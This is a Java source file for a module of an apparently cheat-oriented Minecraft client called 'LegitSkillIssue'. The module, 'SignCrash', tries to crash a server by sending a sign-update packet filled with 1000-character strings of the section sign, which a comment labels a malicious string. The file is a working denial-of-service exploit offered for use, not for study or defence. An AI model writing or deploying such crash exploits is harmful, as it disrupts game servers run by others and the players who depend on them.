package com.LegitSkillIssue.client.module.world;

import com.LegitSkillIssue.client.module.Module;
import com.LegitSkillIssue.client.module.Category;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.util.math.BlockPos;

public class SignCrashModule extends Module {
    public SignCrashModule() {
        super("SignCrash", "Attempts to crash server using signs.", Category.WORLD);
    }

    @Override
    public void onTick() {
        if (mc.player == null || mc.getNetworkHandler() == null) return;

        BlockPos pos = mc.player.getBlockPos();
        String longStr = "§".repeat(1000); // Malicious string
        
        mc.getNetworkHandler().sendPacket(new UpdateSignC2SPacket(pos, true, longStr, longStr, longStr, longStr));
        setEnabled(false); // Run once
    }
}
